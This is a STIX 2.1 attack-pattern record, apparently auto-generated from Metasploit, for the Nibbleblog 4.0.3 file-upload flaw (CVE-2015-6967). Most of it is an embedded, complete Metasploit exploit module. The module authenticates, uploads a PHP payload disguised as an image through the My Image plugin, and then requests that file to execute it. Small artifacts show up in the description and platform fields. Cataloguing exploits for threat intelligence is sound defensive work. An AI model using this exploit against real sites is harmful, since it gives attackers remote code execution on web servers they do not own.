{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--460df60c-ccb0-4ec5-a783-812498e231a6",
    "created": "2024-08-14T17:10:40.695853Z",
    "modified": "2024-08-14T17:10:40.695856Z",
    "name": "Nibbleblog File Upload Vulnerability",
    "description": " Nibbleblog contains a flaw that allows an authenticated remote attacker to execute arbitrary PHP code. This module was tested on version 4.0.3.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/nibbleblog_file_upload.rb",
            "external_id": "nibbleblog_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-6967"
        },
        {
            "source_name": "reference",
            "url": "http://blog.curesec.com/article/blog/NibbleBlog-403-Code-Execution-47.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'Nibbleblog File Upload Vulnerability',\n      'Description'     => %q{\n          Nibbleblog contains a flaw that allows an authenticated remote\n          attacker to execute arbitrary PHP code. This module was\n          tested on version 4.0.3.\n        },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Unknown', # Vulnerability Disclosure - Curesec Research Team. Author's name?\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module\n        ],\n      'References'      =>\n        [\n          ['CVE', '2015-6967'],\n          ['URL', 'http://blog.curesec.com/article/blog/NibbleBlog-403-Code-Execution-47.html']\n        ],\n      'DisclosureDate'  => '2015-09-01',\n      'Platform'        => 'php',\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [['Nibbleblog 4.0.3', {}]],\n      'DefaultTarget'   => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI',  [true, 'The base path to the web application', '/']),\n        OptString.new('USERNAME',   [true, 'The username to authenticate with']),\n        OptString.new('PASSWORD',   [true, 'The password to authenticate with'])\n      ])\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def check\n    cookie = do_login(username, password)\n    return Exploit::CheckCode::Detected unless cookie\n\n    res = send_request_cgi(\n      'method'      => 'GET',\n      'uri'         => normalize_uri(target_uri.path, 'admin.php'),\n      'cookie'      => cookie,\n      'vars_get'    => {\n        'controller'  => 'settings',\n        'action'      => 'general'\n      }\n    )\n\n    if res && res.code == 200 && res.body.include?('Nibbleblog 4.0.3 \"Coffee\"')\n      return Exploit::CheckCode::Appears\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def do_login(user, pass)\n    res = send_request_cgi(\n      'method'      => 'GET',\n      'uri'         => normalize_uri(target_uri.path, 'admin.php')\n    )\n\n    fail_with(Failure::Unreachable, 'No response received from the target.') unless res\n\n    session_cookie = res.get_cookies\n    vprint_status(\"Logging in...\")\n    res = send_request_cgi(\n      'method'      => 'POST',\n      'uri'         => normalize_uri(target_uri.path, 'admin.php'),\n      'cookie'      => session_cookie,\n      'vars_post'   => {\n        'username'  => user,\n        'password'  => pass\n      }\n    )\n\n    return session_cookie if res && res.code == 302 && res.headers['Location']\n    nil\n  end\n\n  def exploit\n    unless [ Exploit::CheckCode::Detected, Exploit::CheckCode::Appears ].include?(check)\n      print_error(\"Target does not appear to be vulnerable.\")\n      return\n    end\n\n    vprint_status(\"Authenticating using #{username}:#{password}\")\n\n    cookie = do_login(username, password)\n    fail_with(Failure::NoAccess, 'Unable to login. Verify USERNAME/PASSWORD or TARGETURI.') if cookie.nil?\n    vprint_good(\"Authenticated with Nibbleblog.\")\n\n    vprint_status(\"Preparing payload...\")\n    payload_name = \"#{Rex::Text.rand_text_alpha_lower(10)}.php\"\n\n    data = Rex::MIME::Message.new\n    data.add_part('my_image', nil, nil, 'form-data; name=\"plugin\"')\n    data.add_part('My image', nil, nil, 'form-data; name=\"title\"')\n    data.add_part('4', nil, nil, 'form-data; name=\"position\"')\n    data.add_part('', nil, nil, 'form-data; name=\"caption\"')\n    data.add_part(payload.encoded, 'application/x-php', nil, \"form-data; name=\\\"image\\\"; filename=\\\"#{payload_name}\\\"\")\n    data.add_part('1', nil, nil, 'form-data; name=\"image_resize\"')\n    data.add_part('230', nil, nil, 'form-data; name=\"image_width\"')\n    data.add_part('200', nil, nil, 'form-data; name=\"image_height\"')\n    data.add_part('auto', nil, nil, 'form-data; name=\"image_option\"')\n    post_data = data.to_s\n\n    vprint_status(\"Uploading payload...\")\n    res = send_request_cgi(\n      'method'        => 'POST',\n      'uri'           => normalize_uri(target_uri, 'admin.php'),\n      'vars_get'      => {\n        'controller'  => 'plugins',\n        'action'      => 'config',\n        'plugin'      => 'my_image'\n      },\n      'ctype'         => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'          => post_data,\n      'cookie'        => cookie\n    )\n\n    if res && /Call to a member function getChild\\(\\) on a non\\-object/ === res.body\n      fail_with(Failure::Unknown, 'Unable to upload payload. Does the server have the My Image plugin installed?')\n    elsif res && !( res.body.include?('<b>Warning</b>') || res.body.include?('warn') )\n      fail_with(Failure::Unknown, 'Unable to upload payload.')\n    end\n\n    vprint_good(\"Uploaded the payload.\")\n\n    php_fname = 'image.php'\n    payload_url = normalize_uri(target_uri.path, 'content', 'private', 'plugins', 'my_image', php_fname)\n    vprint_status(\"Parsed response.\")\n\n    register_files_for_cleanup(php_fname)\n    vprint_status(\"Executing the payload at #{payload_url}.\")\n    send_request_cgi(\n      'uri'     => payload_url,\n      'method'  => 'GET'\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-09-01",
    "x_mitre_platforms": [
        "php'"
    ]
}